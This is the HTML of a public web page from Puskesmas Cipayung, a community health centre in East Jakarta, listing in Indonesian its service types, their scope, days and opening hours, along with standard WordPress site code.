	<li  id="menu-item-553" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-553 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/tentang-kami/" class="dropdown-item"><span itemprop="name">Tentang Kami</span></a></li>
	<li  id="menu-item-856" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-856 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/informasi/list-telepon-puskesmas/" class="dropdown-item"><span itemprop="name">LIST TELEPON PUSKESMAS</span></a></li>
</ul>
</li>
<li  id="menu-item-542" class="menu-item menu-item-type-post_type menu-item-object-page current-page-ancestor current-menu-ancestor current-menu-parent current-page-parent current_page_parent current_page_ancestor menu-item-has-children dropdown active menu-item-542 nav-item"><a href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle nav-link" id="menu-item-dropdown-542"><span itemprop="name">Pelayanan</span></a>
<ul class="dropdown-menu" aria-labelledby="menu-item-dropdown-542">
	<li  id="menu-item-579" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-575 current_page_item active menu-item-579 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/pelayanan/jadwal-pelayanan/" class="dropdown-item" aria-current="page"><span itemprop="name">Jadwal Pelayanan</span></a></li>
</ul>
</li>
<li  id="menu-item-228" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-228 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/hubungi-kami/" class="nav-link"><span itemprop="name">Hubungi Kami</span></a></li>
<li  id="menu-item-802" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-802 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/informasiupdate/" class="nav-link"><span itemprop="name">HOT INFO!</span></a></li>
<li  id="menu-item-842" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-842 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/informasi/frequently-asked-questions/" class="nav-link"><span itemprop="name">Pertanyaan Populer !</span></a></li>
<li  id="menu-item-1235" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-1235 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/blog/2025/07/23/rumah-jiwa/" class="nav-link"><span itemprop="name">RUMAH JIWA 💚</span></a></li>
<li  id="menu-item-1266" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1266 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/sentra-emas/" class="nav-link"><span itemprop="name">SENTRA EMAS 💛</span></a></li>
</ul></div>					</div>
				     
							<div class="make-booking">
									<a data-bs-toggle="modal" href="#appointment" class="btn btn-default makebooking">Ada Pertanyaan ?</a>
							</div>
						 
				          

				</div>
			</div>
        </nav><!-- #site-navigation -->
	     
			<!-- Make appointment model -->
	<section id="section23" class="appointment">
	  <div class="modal fade" id="appointment" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
		<div class="modal-dialog style-one" role="document">
		  <div class="modal-content">
			<div class="modal-header">
			  <h4 class="modal-title" id="myModalLabel">Make an Appoinment</a></h4>
			  <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
			</div>
			<div class="modal-body">
			  <div class="appoinment-form-outer">
				
<div class="wpcf7 no-js" id="wpcf7-f24-o1" lang="en-US" dir="ltr" data-wpcf7-id="24">
<div class="screen-reader-response"><p role="status" aria-live="polite" aria-atomic="true"></p> <ul></ul></div>
<form action="/pelayanan/jadwal-pelayanan/#wpcf7-f24-o1" method="post" class="wpcf7-form init" aria-label="Contact form" novalidate="novalidate" data-status="init">
<div style="display: none;">
<input type="hidden" name="_wpcf7" value="24" />
<input type="hidden" name="_wpcf7_version" value="6.0.6" />
<input type="hidden" name="_wpcf7_locale" value="en_US" />
<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f24-o1" />
<input type="hidden" name="_wpcf7_container_post" value="0" />
<input type="hidden" name="_wpcf7_posted_data_hash" value="" />
</div>
<p><label> Nama (wajib diisi)<br />
<span class="wpcf7-form-control-wrap" data-name="your-name"><input size="40" maxlength="400" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" value="" type="text" name="your-name" /></span> </label>
</p>
<p><label> Email (wajib diisi)<br />
<span class="wpcf7-form-control-wrap" data-name="your-email"><input size="40" maxlength="400" class="wpcf7-form-control wpcf7-email wpcf7-validates-as-required wpcf7-text wpcf7-validates-as-email" aria-required="true" aria-invalid="false" value="" type="email" name="your-email" /></span> </label>
</p>
<p><label> Jenis Pelaporan </label><br />
<span class="wpcf7-form-control-wrap" data-name="JenisPelaporan"><select class="wpcf7-form-control wpcf7-select wpcf7-validates-as-required" aria-required="true" aria-invalid="false" name="JenisPelaporan"><option value="">&#8212;Please choose an option&#8212;</option><option value="Pertanyaan">Pertanyaan</option><option value="Kritik">Kritik</option><option value="Saran">Saran</option><option value="Informasi">Informasi</option><option value="Lain nya ..">Lain nya ..</option></select></span>
</p>
<p><label> Isi Pelaporan </label><br />
<span class="wpcf7-form-control-wrap" data-name="text-503"><input size="40" maxlength="400" class="wpcf7-form-control wpcf7-text" aria-invalid="false" placeholder="Silahkan Isi Disini" value="" type="text" name="text-503" /></span>
</p>
<p><label> No.Telp / WA (wajib diisi)<br />
<span class="wpcf7-form-control-wrap" data-name="Telp"><input size="40" maxlength="400" class="wpcf7-form-control wpcf7-tel wpcf7-validates-as-required wpcf7-text wpcf7-validates-as-tel" aria-required="true" aria-invalid="false" placeholder="isikan No.Telp Disini" value="" type="tel" name="Telp" /></span><br />
<input class="wpcf7-form-control wpcf7-submit has-spinner" type="submit" value="Send" /></label>
</p><p style="display: none !important;" class="akismet-fields-container" data-prefix="_wpcf7_ak_"><label>&#916;<textarea name="_wpcf7_ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="_wpcf7_ak_js" value="78"/><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p><div class="wpcf7-response-output" aria-hidden="true"></div>
</form>
</div>
			  </div>
			</div>
		  </div>
		</div>
	  </div>
	</section>
	  
    
	</header><!-- #masthead -->
	
    <section id="inner-title" class="inner-title" >
        <div class="container">
            <div class="row">
                                
                  <div class="col-md-7"><h2>Jadwal Pelayanan</h2></div>
              
                                    <div class="col-md-5">
                        <div class="breadcrumbs">
                            <nav role="navigation" aria-label="Breadcrumbs" class="breadcrumb-trail breadcrumbs" itemprop="breadcrumb"><h2 class="trail-browse">Browse</h2><ul class="trail-items" itemscope itemtype="http://schema.org/BreadcrumbList"><meta name="numberOfItems" content="3" /><meta name="itemListOrder" content="Ascending" /><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem" class="trail-item trail-begin"><a href="https://puskesmascipayung.com" rel="home"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem" class="trail-item"><a href="https://puskesmascipayung.com/pelayanan/"><span itemprop="name">Pelayanan Puskesmas</span></a><meta itemprop="position" content="2" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem" class="trail-item trail-end"><span itemprop="name">Jadwal Pelayanan</span><meta itemprop="position" content="3" /></li></ul></nav>                        </div>
                    </div>
                            </div>
        </div>
    </section>
    
    <section id="section16" class="section16">
        <div class="container">
            <div class="row">
                <div class="col-sm-12 col-md-12  col-lg-9  left-block">
                    <div id="post-575" class="post-575 page type-page status-publish hentry">
			 

			<div class="textcont">
			
<div class="wp-block-columns is-layout-flex wp-container-core-columns-is-layout-9d6595d7 wp-block-columns-is-layout-flex">
<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"></div></div>



<div class="wp-block-columns are-vertically-aligned-center is-layout-flex wp-container-core-columns-is-layout-9d6595d7 wp-block-columns-is-layout-flex">
<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow"></div>



<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow"></div>
</div>



<p class="has-text-align-left"><strong>Pelayanan Dalam Gedung</strong></p>
<figure class="wp-block-table alignleft is-style-stripes"><table class="has-fixed-layout"><tbody>
<tr>
<td width="36"><strong>No</strong></td>
<td width="170"><strong>Jenis Pelayanan</strong></td>
<td width="400"><strong>Ruang Lingkup Pelayanan</strong></td>
<td width="123"><strong>Hari Pelayanan</strong></td>
<td width="124"><strong>Jam Pelayanan</strong></td>

</tr>
<tr>
<td width="36">1</td>
<td width="170">Pelayanan  pendaftaran dan Rekam Medik</td>
<td width="178">Pendaftaran, pelayanan BPJS</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>


</tr>
<tr>
<td width="36">2</td>
<td width="170">Pelayanan Pemeriksaan Umum</td>
<td width="178">Pelayanan Kesehatan Umum dan Konsultasi</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
<tr>
<td width="36">3</td>
<td width="170">Pelayanan  Kesehatan Gigi dan Mulut</td>
<td width="178">Pelayanan kesehatan gigi dan mulut dan Konsultasi kesehatan gigi dan mulut</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>

</tr>
<tr>
<td width="36">4</td>
<td width="170">Pelayanan Lansia</td>
<td width="178">Pelayanan Kesehatan Umum dan Konsultasi pada Lanjut Usia</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>

</tr>
<tr>
<td width="36">5</td>
<td width="170">Pelayanan KB</td>
<td width="178">Pelayanan suntik KB, implant/susuk, kondom, Pil, IUD, IVA test</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>

</tr>
<tr>
<td width="36">6</td>
<td width="170">Pelayanan MTBS</td>
<td width="178">Pelayanan pengobatan anak/balita konsultasi</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>

</tr>
<tr>
<td width="36">7</td>
<td width="170">Pelayanan Gizi</td>
<td width="178">Konseling Gizi</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>

</tr>
<tr>
<td width="36">8</td>
<td width="170">Pelayanan Kesehatan Anak</td>
<td width="178">&#8211; Imunisasi dasar pada bayi <p>(Polio, BCG, HB, HIB, DPT, Campak, DT dan TT)</p>
<p>&#8211;	Imunisasi TT pada ibu hamil</p>
<p>&#8211;	Imunisasi pada Caten</p>
<p>&#8211;	Imunisasi pada calon Jemaah haji</p>
</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
<tr>
<td width="36">9</td>
<td width="170">Pelayanan Konseling</td>
<td width="178">Konseling</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
<tr>
<td width="36">10</td>
<td width="170">Pelayanan PKPR</td>
<td width="178">Pelayanan kesehatan umum dan konsultasi pada usia 10 sd 20 tahun kurang sehari</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
<tr>
<td width="36">11</td>
<td width="170">Pelayanan Haji</td>
<td width="178">Pelayanan kesehatan umum dan konsultasi pada calon Jamaah haji </td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
<tr>
<td width="36">12</td>
<td width="170">Pelayanan DOTS/KUSTA</td>
<td width="178">Pelayanan kesehatan dan konsultasi pada pasien TB dan Kusta</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
<tr>
<td width="36">13</td>
<td width="170">Pelayanan KI</td>
<td width="178">Pemeriksaan kehamilan, nifas, kasus gynecologi</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
<tr>
<td width="36">14</td>
<td width="170">Pelayanan  Kiss (Hiv/Ims)</td>
<td width="178">Pelayanan kesehatan dan konsultasi pada pasien HIV dan IMS</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
<tr>
<td width="36">15</td>
<td width="170">Pelayanan Persalinan</td>
<td width="178">Pelayanan pertolongan persalinan dan perawatan paska persalinan</td>
<td width="123">Senin &#8211; Minggu<p></p>
<td width="124">24 Jam<p></p>
</tr>
<tr>
<td width="36">16</td>
<td width="170">Pelayanan  Tindakan (Perawatan Luka Semanis Madu) </td>
<td width="178">Nebulizer, Bedah Minor,tindakan medis darurat, Rawat luka</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
<tr>
<td width="36">17</td>
<td width="170">Pelayanan  PTM</td>
<td width="178">Pelayanan kesehatan dan konsultasi pada pasien penyakit tidak menular</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>

</tr>
<tr>
<td width="36">18</td>
<td width="170">Pelayanan Prolanis</td>
<td width="178">Pelayanan pemeriksaan kesehatan pasien Hipertensi, DM</td>
<td width="123">Sesuai Jadwal<p></p>
<td width="124">Sesuai Jadwal<p></p>
</tr>
<tr>
<td width="36">19</td>
<td width="170">Pelayanan  Penapisan Covid-19</td>
<td width="178">Pelayanan pemeriksaan pasien yang mengalami salah satu atau lebih gejala batuk, demam, pilek, sakit tenggorokan</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
<tr>
<td width="36">20</td>
<td width="170">Pelayanan Calon Pengantin <p>(Caten)</p></td>
<td width="178">Pelayanan Skrining Kesehatan dan konsultasi pada Calon Pengantin</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>

<p>07.30 – 16.30</p>
</tr>
<tr>
<td width="36">21</td>
<td width="170">Pelayanan KTPA</td>
<td width="178">Pelayanan Konsultasi Pada Korban Kekerasan Terhadap Perempuan dan Anak</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
</td>
</tr>
</tbody>
</table></figure>
</div>
</div>



<p><strong>Pelayanan Penunjang</strong></p>



<figure class="wp-block-table alignleft is-style-stripes"><table class="has-fixed-layout"><tbody>
<tr>
<td width="36"><strong>No</strong></td>
<td width="170"><strong>Jenis Pelayanan</strong></td>
<td width="400"><strong>Ruang Lingkup Pelayanan</strong></td>
<td width="123"><strong>Buka Setiap Hari</strong></td>
<td width="124"><strong>Jam Pelayanan</strong></td>

</tr>
<tr>
<td width="36">22</td>
<td width="170">Pelayanan Farmasi</td>
<td width="178">Pelayanan pengambilan obat</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>

</tr>
<tr>
<td width="36">23</td>
<td width="170">Pelayanan Laboratorium</td>
<td width="178">Pelayanan pemeriksaan laboratorium</td>
<td width="123">Senin – Kamis<p></p>
<p>Jum’at</p>
<td width="124">07.30 – 16.00<p></p>
<p>07.30 – 16.30</p>
</tr>
</td>
</tr>
</tbody>
</table></figure>



<p><strong>Pelayanan Luar Gedung</strong></p>



<figure class="wp-block-table alignleft is-style-stripes"><table class="has-fixed-layout"><tbody>
<tr>
<td width="36"><strong>No</strong></td>
<td width="170"><strong>Jenis Pelayanan</strong></td>
<td width="400"><strong>Ruang Lingkup Pelayanan</strong></td>
<td width="123"><strong>Buka Setiap Hari</strong></td>
<td width="124"><strong>Jam Pelayanan</strong></td>

</tr>
<tr>
<td width="36">24</td>
<td width="170">Pelayanan Panti Sosial</td>
<td width="178">Pelayanan kesehatan umum dan konsultasi pada  panti sosial</td>
<td width="123">Senin – Jumát<p></p>
<td width="124">09.00 – 14.00<p></p>
</tr>
</td>
</tr>
</tbody>
</table></figure>



<p><strong>Gawat Darurat</strong></p>



<figure class="wp-block-table alignleft is-style-stripes"><table class="has-fixed-layout"><tbody>
<tr>
<td width="36"><strong>No</strong></td>
<td width="170"><strong>Jenis Pelayanan</strong></td>
<td width="400"><strong>Ruang Lingkup Pelayanan</strong></td>
<td width="123"><strong>Buka Setiap Hari</strong></td>
<td width="124"><strong>Jam Pelayanan</strong></td>

</tr>
<tr>
<td width="36">25</td>
<td width="170">Pelayanan 24 Jam</td>
<td width="178">Pelayanan kesehatan umum dan gawat darurat</td>
<td width="123">Senin – Minggu<p></p>
<td width="124">24 Jam<p></p>
</tr>
<tr>
<td width="36">26</td>
<td width="170">Pelayanan Bantuan kesehatan lapangan Gawat darurat</td>
<td width="178">Pelayanan kesehatan umum dan gawat darurat di luar gedung</td>
<td width="123">Senin – Minggu<p></p>
<td width="124">24 Jam<p></p>

</tr>
</td>
</tr>
</tbody>
</table></figure>
			</div>
</div><!-- #post-## -->                </div><!-- div -->
                           </div><!-- div -->
        </div>
    </section>

    <section id="section-contact-link" class="contact-link">
      <div class="container">
          <div class="section-contact-full clearfix">
		    <div class="row">
              <div class="col-sm-12 col-md-3 col-lg-2 d-none d-md-block">
                  <div class="contact-link-img">
                     <img src="https://puskesmascipayung.com/wp-content/uploads/2024/11/LOGO-PUSKES-REV.png" alt="">
                  </div>
              </div>
              <div class="col-sm-12 col-md-9 col-lg-6">
                  <div class="contact-link-desc">
                     <h5>Puskesmas Cipayung Jakarta Timur</h5>
                     <span>Melayani dengan setulus hati</span>
                  </div>
              </div>
            <div class="col-sm-12 col-md-9 col-lg-4">
                <div class="contact-link-btn">
                     <a href="https://puskesmascipayung.com/tentang-kami/" class="contact-us">Tentang Kami</a>
                </div>
            </div>
          </div>
        </div>
      </div>
    </section>
   <section id="footer-top" class="footer-top">
      <div class="container footer-widget-top">
          <div class="row">
            <div class="col-md-12">
              <div class="top-widget-contacts">
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-lg-4 widget">
                       
                       <div class="widget-contact-icon pull-left">
                          <i class="fa  fa-globe" aria-hidden="true"></i>
                        </div>
                       
                        <div class="widget-contact-info">
                          <p class="top-widget-contacts-title">Kunjungi Kami</p>
                          <p class="top-widget-contacts-content">Jl. Bambu Hitam No.104 Cipayung</p>
                        </div>

                    </div>
                    <div class="col-xs-12 col-sm-12 col-lg-4 widget">
                        <div class="widget-contact-icon pull-left">
                          <i class="fa fa-envelope-o" aria-hidden="true"></i>
                        </div>
                        
                        <div class="widget-contact-info">
                          <p class="top-widget-contacts-title">Email</p>
                          <p class="top-widget-contacts-content"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d6a6a3a5bdb3a5bbb7a5f8b5bfa6b7afa3b8b196bcb7bdb7a4a2b7f8b1b9f8bfb2">[email&#160;protected]</a></p>
                        </div>

                    </div>
                    <div class="col-xs-12 col-sm-12 col-lg-4 widget">
                       
                        <div class="widget-contact-icon pull-left">
                           <i class="fa fa-phone" aria-hidden="true"></i>
                        </div>

                        <div class="widget-contact-info">
                           <p class="top-widget-contacts-title">Telp.</p>
                           <p class="top-widget-contacts-content">(021) 845 949 40</p>
                        </div>

                    </div>
                </div>
              </div>
            </div>
          </div>
      </div>
                  <div class="container">
                <div class="row">
                         
                                      <div class="col-lg-3">
                                          <div class="footer-top-box wow fadeInUp">
                                              <section id="custom_html-2" class="widget_text widget widget_custom_html"><h4 class="widget-title">Temukan Kami</h4><div class="textwidget custom-html-widget"><br>
<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3965.5342770962598!2d106.89755501552762!3d-6.324731495422834!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e69ed3a620e797f%3A0x7b4e0dd124208732!2sPuskesmas%20Kecamatan%20Cipayung!5e0!3m2!1sid!2sid!4v1569903056229!5m2!1sid!2sid" width="400" height="300" frameborder="0" style="border:0;" allowfullscreen=""></iframe></div></section>                                          </div>
                      
                                      </div>
                       
                                      <div class="col-lg-3">
                                          <div class="footer-top-box wow fadeInUp">
                                              <section id="meta-1" class="widget widget_meta"><h4 class="widget-title">Meta</h4>
		<ul>
						<li><a href="https://puskesmascipayung.com/wp-login.php">Log in</a></li>
			<li><a href="https://puskesmascipayung.com/feed/">Entries feed</a></li>
			<li><a href="https://puskesmascipayung.com/comments/feed/">Comments feed</a></li>

			<li><a href="https://wordpress.org/">WordPress.org</a></li>
		</ul>

		</section>                                          </div>
                      
                                      </div>
                       
                                      <div class="col-lg-3">
                                          <div class="footer-top-box wow fadeInUp">
                                              <section id="calendar-2" class="widget widget_calendar"><div id="calendar_wrap" class="calendar_wrap"><table id="wp-calendar" class="wp-calendar-table">
	<caption>September 2025</caption>
	<thead>
	<tr>
		<th scope="col" aria-label="Monday">M</th>
		<th scope="col" aria-label="Tuesday">T</th>
		<th scope="col" aria-label="Wednesday">W</th>
		<th scope="col" aria-label="Thursday">T</th>
		<th scope="col" aria-label="Friday">F</th>
		<th scope="col" aria-label="Saturday">S</th>
		<th scope="col" aria-label="Sunday">S</th>
	</tr>
	</thead>
	<tbody>
	<tr><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td>
	</tr>
	<tr>
		<td>8</td><td>9</td><td>10</td><td>11</td><td>12</td><td>13</td><td>14</td>
	</tr>
	<tr>
		<td>15</td><td>16</td><td>17</td><td id="today">18</td><td>19</td><td>20</td><td>21</td>
	</tr>
	<tr>
		<td>22</td><td>23</td><td>24</td><td>25</td><td>26</td><td>27</td><td>28</td>
	</tr>
	<tr>
		<td>29</td><td>30</td>
		<td class="pad" colspan="5">&nbsp;</td>
	</tr>
	</tbody>
	</table><nav aria-label="Previous and next months" class="wp-calendar-nav">
		<span class="wp-calendar-nav-prev"><a href="https://puskesmascipayung.com/blog/2025/07/">&laquo; Jul</a></span>
		<span class="pad">&nbsp;</span>
		<span class="wp-calendar-nav-next">&nbsp;</span>
	</nav></div></section><section id="custom_html-6" class="widget_text widget widget_custom_html"><h4 class="widget-title">Mars Puskesmas</h4><div class="textwidget custom-html-widget">[sc_embed_player_template1 fileurl="https://puskesmascipayung.com/wp-content/uploads/2020/05/MARS-PKC1.mp3" autoplay="true" loops="true"]</div></section>                                          </div>
                      
                                      </div>
                       
                                      <div class="col-lg-3">
                                          <div class="footer-top-box wow fadeInUp">
                                              <section id="nav_menu-2" class="widget widget_nav_menu"><h4 class="widget-title">Link Terkait</h4><div class="menu-link-terkait-container"><ul id="menu-link-terkait" class="menu" itemscope itemtype="http://www.schema.org/SiteNavigationElement"><li id="menu-item-176" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-176"><a target="_blank" href="https://www.kemkes.go.id/">Kementrian Kesehatan</a></li>
<li id="menu-item-367" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-367"><a target="_blank" href="https://www.dinkes.jakarta.go.id">Dinkes DKI</a></li>
<li id="menu-item-376" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-376"><a href="https://sudinkesehatantimur.jakarta.go.id/">Sudinkes Jakarta Timur</a></li>
<li id="menu-item-217" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-217"><a href="https://agddinkes.jakarta.go.id/">AGD Dinkes DKI</a></li>
</ul></div></section>                                          </div>
                      
                                      </div>
                        
                </div>
            </div>
         
  </section>

  <section id="footer-bottom" class="footer-bottom">
      <div class="container">
          <div class="row">
              <div class="col-md-12">
                  <div class="copyright">
                    Copyright &copy; All Rights Reserved. 2025                  </div>
                  <div class="powered_by site-copyright">
                      <span><a href="https://wordpress.org/">Proudly powered by WordPress</a>
                      </span>
                      <span class="sep"> | </span>
                     Theme: <a href="https://www.canyonthemes.com/downloads/better-health/">BetterHealth</a> by <a href="https://www.canyonthemes.com">CanyonThemes</a>.                  </div>
              </div>
          </div>
      </div>
</section>

<a href="#" class="scrollup"><i class="fa fa-angle-double-up"></i></a>
 <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/better-health\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>
<script type="text/javascript">
        jQuery(function(){
        var arrLiveStats=[];
        var WSM_PREFIX="wsm";
		
        jQuery(".if-js-closed").removeClass("if-js-closed").addClass("closed");
                var wsmFnSiteLiveStats=function(){
                           jQuery.ajax({
                               type: "POST",
                               url: wsm_ajaxObject.ajax_url,
                               data: { action: 'liveSiteStats', requests: JSON.stringify(arrLiveStats), r: Math.random() }
                           }).done(function( strResponse ) {
                                if(strResponse!="No"){
                                    arrResponse=JSON.parse(strResponse);
                                    jQuery.each(arrResponse, function(key,value){
                                    
                                        $element= document.getElementById(key);
                                        oldValue=parseInt($element.getAttribute("data-value").replace(/,/g, ""));
                                        diff=parseInt(value.replace(/,/g, ""))-oldValue;
                                        $class="";
                                        
                                        if(diff>=0){
                                            diff="+"+diff;
                                        }else{
                                            $class="wmcRedBack";
                                        }

                                        $element.setAttribute("data-value",value);
                                        $element.innerHTML=diff;
                                        jQuery("#"+key).addClass($class).show().siblings(".wsmH2Number").text(value);
                                        
                                        if(key=="SiteUserOnline")
                                        {
                                            var onlineUserCnt = arrResponse.wsmSiteUserOnline;
                                            if(jQuery("#wsmSiteUserOnline").length)
                                            {
                                                jQuery("#wsmSiteUserOnline").attr("data-value",onlineUserCnt);   jQuery("#wsmSiteUserOnline").next(".wsmH2Number").html("<a target=\"_blank\" href=\"?page=wsm_traffic&subPage=UsersOnline&subTab=summary\">"+onlineUserCnt+"</a>");
                                            }
                                        }
                                    });
                                    setTimeout(function() {
                                        jQuery.each(arrResponse, function(key,value){
                                            jQuery("#"+key).removeClass("wmcRedBack").hide();
                                        });
                                    }, 1500);
                                }
                           });
                       }
                       if(arrLiveStats.length>0){
                          setInterval(wsmFnSiteLiveStats, 10000);
                       }});
        </script><style id='core-block-supports-inline-css' type='text/css'>
.wp-container-core-columns-is-layout-9d6595d7{flex-wrap:nowrap;}
</style>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6" id="wp-hooks-js"></script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
<script type="text/javascript" id="wp-i18n-js-after">
/* <![CDATA[ */
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
/* ]]> */
</script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=6.0.6" id="swv-js"></script>
<script type="text/javascript" id="contact-form-7-js-before">
/* <![CDATA[ */
var wpcf7 = {
    "api": {
        "root": "https:\/\/puskesmascipayung.com\/wp-json\/",
        "namespace": "contact-form-7\/v1"
    }
};
/* ]]> */
</script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=6.0.6" id="contact-form-7-js"></script>
<script type="text/javascript" defer="defer" src="//cdn.canyonthemes.com/?product=better_health&amp;version=1758179426&amp;ver=6.8.2" id="better_health-free-license-validation-js"></script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-content/themes/better-health/assets/js/bootstrap.min.js?ver=4.5.2" id="bootstrap-js"></script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-content/themes/better-health/assets/js/bootstrap-dropdownhover.min.js?ver=20151215" id="bootstrap-dropdownhover-js"></script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-content/themes/better-health/assets/js/jquery.isotope.min.js?ver=20151215" id="jquery-isotope-js"></script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-content/themes/better-health/assets/js/jquery.magnific-popup.js?ver=4.5.1" id="jquery-magnific-popup-js"></script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-content/themes/better-health/assets/js/wow.min.js?ver=4.5.1" id="wow-js"></script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-content/themes/better-health/assets/js/owl.carousel.js?ver=4.5.1" id="owl-carousel-js"></script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-content/themes/better-health/assets/js/waypoints.min.js?ver=20151215" id="waypoints-js"></script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-content/themes/better-health/assets/js/main.js?ver=4.5.1" id="better-health-main-js"></script>
